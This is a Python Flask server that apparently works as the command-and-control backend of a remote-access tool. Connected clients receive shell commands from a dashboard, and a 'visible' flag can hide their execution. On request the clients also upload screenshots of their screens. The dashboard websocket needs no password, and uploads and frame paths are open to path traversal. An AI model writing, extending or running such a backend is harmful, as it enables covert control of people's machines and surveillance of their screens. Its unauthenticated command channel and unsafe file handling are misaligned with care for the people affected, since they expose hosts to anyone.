import os
import sqlite3
import base64
import json
import threading

from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_sock import Sock
from functools import wraps
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
sock = Sock(app)

DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")

if not DASHBOARD_PASSWORD:
    raise RuntimeError("DASHBOARD_PASSWORD is not set")

SCREENSHOT_DIR = "uploaded_frames"

os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Thread-safe in-memory state for WebSocket connections
clients_lock = threading.Lock()
connected_clients = {}  # username -> {'run_ws': ws, 'frames_ws': ws, 'online': bool}
dashboard_sockets = set()


def broadcast_dashboard(msg):
    payload = json.dumps(msg)
    with clients_lock:
        dead = set()
        for d_ws in list(dashboard_sockets):
            try:
                d_ws.send(payload)
            except Exception:
                dead.add(d_ws)
        for d_ws in dead:
            dashboard_sockets.discard(d_ws)


def update_client_in_db(username, visible=None, capture=None, cmd=None, run=None):
    conn = get_db()
    conn.execute(
        """
        INSERT INTO clients (username, updated_at)
        VALUES (?, datetime('now'))
        ON CONFLICT(username) DO UPDATE SET updated_at = datetime('now')
    """,
        (username,),
    )
    if visible is not None:
        conn.execute(
            "UPDATE clients SET visible = ? WHERE username = ?", (visible, username)
        )
    if capture is not None:
        conn.execute(
            "UPDATE clients SET capture = ? WHERE username = ?", (capture, username)
        )
    if cmd is not None:
        conn.execute(
            "UPDATE clients SET cmd = ?, run = 1 WHERE username = ?", (cmd, username)
        )
    if run is not None:
        conn.execute(
            "UPDATE clients SET run = ? WHERE username = ?", (run, username)
        )
    conn.commit()
    conn.close()


def get_db():
    conn = sqlite3.connect("database.db")
    conn.row_factory = sqlite3.Row
    return conn


def require_password(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        password = request.headers.get("x-password")

        if not password or password != DASHBOARD_PASSWORD:
            return jsonify({"detail": "Unauthorized"}), 401

        return f(*args, **kwargs)

    return wrapper


def init_db():
    conn = get_db()

    conn.execute("""
        CREATE TABLE IF NOT EXISTS clients (
            username TEXT PRIMARY KEY,
            cmd TEXT,
            run INTEGER DEFAULT 0,
            visible INTEGER DEFAULT 1,
            capture INTEGER DEFAULT 0,
            updated_at TEXT
        )
    """)

    conn.commit()
    conn.close()


init_db()


@app.route("/")
def index():
    return render_template("index.html")



# ---------------------------------------------------------------------------
# WebSocket Routes
# ---------------------------------------------------------------------------


@sock.route("/ws/run")
def ws_run(ws):
    username = request.args.get("username")
    if not username:
        return

    with clients_lock:
        if username not in connected_clients:
            connected_clients[username] = {}
        connected_clients[username]["run_ws"] = ws
        connected_clients[username]["online"] = True

    update_client_in_db(username)
    broadcast_dashboard({"type": "client_status", "username": username, "status": "online"})

    # Deliver any pending command queued in DB upon connection
    try:
        conn = get_db()
        row = conn.execute(
            "SELECT cmd, run, visible FROM clients WHERE username = ?", (username,)
        ).fetchone()
        conn.close()
        if row and row["run"]:
            ws.send(
                json.dumps(
                    {
                        "action": "run_command",
                        "cmd": row["cmd"],
                        "visible": row["visible"] if row["visible"] is not None else 1,
                    }
                )
            )
            update_client_in_db(username, run=0)
    except Exception:
        pass

    try:
        while True:
            data = ws.receive()
            if data is None:
                break
            update_client_in_db(username)
            try:
                msg = json.loads(data)
                if msg.get("action") == "ping":
                    ws.send(json.dumps({"action": "pong"}))
            except Exception:
                pass
    finally:
        with clients_lock:
            if username in connected_clients:
                connected_clients[username]["run_ws"] = None
                if not connected_clients[username].get("frames_ws"):
                    connected_clients[username]["online"] = False
        broadcast_dashboard({"type": "client_status", "username": username, "status": "offline"})


@sock.route("/ws/frames")
def ws_frames(ws):
    username = request.args.get("username")
    if not username:
        return

    with clients_lock:
        if username not in connected_clients:
            connected_clients[username] = {}
        connected_clients[username]["frames_ws"] = ws

    update_client_in_db(username)

    # Push current capture setting from DB
    try:
        conn = get_db()
        row = conn.execute(
            "SELECT capture FROM clients WHERE username = ?", (username,)
        ).fetchone()
        conn.close()
        capture_val = bool(row["capture"]) if row else False
        ws.send(json.dumps({"action": "set_capture", "capture": capture_val}))
    except Exception:
        pass

    try:
        while True:
            data = ws.receive()
            if data is None:
                break
            update_client_in_db(username)
            try:
                msg = json.loads(data)
                act = msg.get("action")
                if act == "upload_frame":
                    filename = msg.get("filename")
                    img_base64 = msg.get("image")
                    if filename and img_base64:
                        client_folder = os.path.join(SCREENSHOT_DIR, username)
                        os.makedirs(client_folder, exist_ok=True)
                        file_path = os.path.join(client_folder, filename)

                        if "," in img_base64:
                            img_base64 = img_base64.split(",", 1)[1]
                        image_bytes = base64.b64decode(img_base64)
                        with open(file_path, "wb") as f:
                            f.write(image_bytes)

                        broadcast_dashboard(
                            {
                                "type": "new_frame",
                                "username": username,
                                "filename": filename,
                            }
                        )
                elif act == "ping":
                    ws.send(json.dumps({"action": "pong"}))
            except Exception:
                pass
    finally:
        with clients_lock:
            if username in connected_clients:
                connected_clients[username]["frames_ws"] = None


@sock.route("/ws/dashboard")
def ws_dashboard(ws):
    with clients_lock:
        dashboard_sockets.add(ws)

    # Send initial state snapshot to connected dashboard
    try:
        conn = get_db()
        rows = conn.execute(
            "SELECT username, updated_at, visible, capture FROM clients ORDER BY updated_at DESC"
        ).fetchall()
        conn.close()

        clients_list = []
        with clients_lock:
            for row in rows:
                u = row["username"]
                is_online = bool(
                    connected_clients.get(u, {}).get("run_ws")
                    or connected_clients.get(u, {}).get("frames_ws")
                )
                clients_list.append(
                    {
                        "username": u,
                        "updated_at": row["updated_at"],
                        "visible": row["visible"] if row["visible"] is not None else 1,
                        "capture": bool(row["capture"]),
                        "online": is_online,
                    }
                )

        ws.send(json.dumps({"type": "init_clients", "clients": clients_list}))
    except Exception:
        pass

    try:
        while True:
            data = ws.receive()
            if data is None:
                break
            try:
                msg = json.loads(data)
                act = msg.get("action")

                if act == "set_command":
                    target_user = msg.get("username")
                    cmd = msg.get("cmd")
                    visible = msg.get("visible", 1)
                    if target_user and cmd is not None:
                        update_client_in_db(target_user, cmd=cmd, visible=visible)
                        target_run_ws = None
                        with clients_lock:
                            target_run_ws = connected_clients.get(
                                target_user, {}
                            ).get("run_ws")
                        if target_run_ws:
                            try:
                                target_run_ws.send(
                                    json.dumps(
                                        {
                                            "action": "run_command",
                                            "cmd": cmd,
                                            "visible": visible,
                                        }
                                    )
                                )
                                update_client_in_db(target_user, run=0)
                            except Exception:
                                pass
                        broadcast_dashboard(
                            {
                                "type": "command_queued",
                                "username": target_user,
                                "visible": visible,
                            }
                        )

                elif act == "set_visibility":
                    target_user = msg.get("username")
                    visible = msg.get("visible")
                    if target_user and visible is not None:
                        update_client_in_db(target_user, visible=visible)
                        broadcast_dashboard(
                            {
                                "type": "visibility_updated",
                                "username": target_user,
                                "visible": visible,
                            }
                        )

                elif act == "set_capture":
                    target_user = msg.get("username")
                    capture = msg.get("capture")
                    if target_user and capture is not None:
                        update_client_in_db(target_user, capture=1 if capture else 0)
                        target_frames_ws = None
                        with clients_lock:
                            target_frames_ws = connected_clients.get(
                                target_user, {}
                            ).get("frames_ws")
                        if target_frames_ws:
                            try:
                                target_frames_ws.send(
                                    json.dumps(
                                        {
                                            "action": "set_capture",
                                            "capture": bool(capture),
                                        }
                                    )
                                )
                            except Exception:
                                pass
                        broadcast_dashboard(
                            {
                                "type": "capture_updated",
                                "username": target_user,
                                "capture": bool(capture),
                            }
                        )

            except Exception:
                pass
    finally:
        with clients_lock:
            dashboard_sockets.discard(ws)


# ---------------------------------------------------------------------------
# REST Endpoints (for fallback & compatibility)
# ---------------------------------------------------------------------------


@app.get("/api/clients")
@require_password
def get_clients():
    conn = get_db()
    rows = conn.execute("""
        SELECT username, updated_at, visible, capture
        FROM clients
        ORDER BY updated_at DESC
    """).fetchall()
    conn.close()

    result = []
    with clients_lock:
        for row in rows:
            u = row["username"]
            is_online = bool(
                connected_clients.get(u, {}).get("run_ws")
                or connected_clients.get(u, {}).get("frames_ws")
            )
            result.append(
                {
                    "username": u,
                    "updated_at": row["updated_at"],
                    "visible": row["visible"] if row["visible"] is not None else 1,
                    "capture": bool(row["capture"]),
                    "online": is_online,
                }
            )

    return jsonify(result)


@app.get("/api/frames/<username>")
@require_password
def get_frames(username):
    user_dir = os.path.join(SCREENSHOT_DIR, username)

    if not os.path.exists(user_dir):
        return jsonify([])

    files = sorted(
        [
            f
            for f in os.listdir(user_dir)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ],
        key=lambda f: int("".join(filter(str.isdigit, f)) or "0"),
    )

    return jsonify(files)


@app.post("/api/visibility")
@require_password
def set_visibility():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    visible = data.get("visible")

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if visible is None:
        return jsonify({"status": "error", "message": "Missing visible"}), 400

    update_client_in_db(username, visible=visible)
    broadcast_dashboard(
        {"type": "visibility_updated", "username": username, "visible": visible}
    )

    return jsonify({"status": "success"})


@app.post("/api/capture")
@require_password
def set_capture():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    capture = data.get("capture")

    if not username or capture is None:
        return jsonify({"status": "error", "message": "Missing arguments"}), 400

    update_client_in_db(username, capture=1 if capture else 0)

    target_frames_ws = None
    with clients_lock:
        target_frames_ws = connected_clients.get(username, {}).get("frames_ws")
    if target_frames_ws:
        try:
            target_frames_ws.send(
                json.dumps({"action": "set_capture", "capture": bool(capture)})
            )
        except Exception:
            pass

    broadcast_dashboard(
        {"type": "capture_updated", "username": username, "capture": bool(capture)}
    )

    return jsonify({"status": "success"})


@app.post("/api/command")
@require_password
def set_command():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    cmd = data.get("cmd")
    visible = data.get("visible", 1)

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if cmd is None:
        return jsonify({"status": "error", "message": "Missing cmd"}), 400

    update_client_in_db(username, cmd=cmd, visible=visible)

    target_run_ws = None
    with clients_lock:
        target_run_ws = connected_clients.get(username, {}).get("run_ws")
    if target_run_ws:
        try:
            target_run_ws.send(
                json.dumps(
                    {
                        "action": "run_command",
                        "cmd": cmd,
                        "visible": visible,
                    }
                )
            )
            update_client_in_db(username, run=0)
        except Exception:
            pass

    broadcast_dashboard(
        {"type": "command_queued", "username": username, "visible": visible}
    )

    return jsonify({"status": "success", "message": "Command queued"})





@app.post("/api/upload")
def upload_screenshot():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    filename = data.get("filename")
    image_base64 = data.get("image")

    if not username or not filename or not image_base64:
        return jsonify({"status": "error", "message": "Missing fields"}), 400

    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)

    file_path = os.path.join(client_folder, filename)

    try:
        if "," in image_base64:
            image_base64 = image_base64.split(",", 1)[1]

        image_bytes = base64.b64decode(image_base64)

        with open(file_path, "wb") as f:
            f.write(image_bytes)

        broadcast_dashboard(
            {"type": "new_frame", "username": username, "filename": filename}
        )

        return jsonify({"status": "success"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.get("/frames/<username>/<filename>")
def get_frame(username, filename):
    user_dir = os.path.join(SCREENSHOT_DIR, username)

    response = send_from_directory(user_dir, filename)
    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5002")), debug=False)

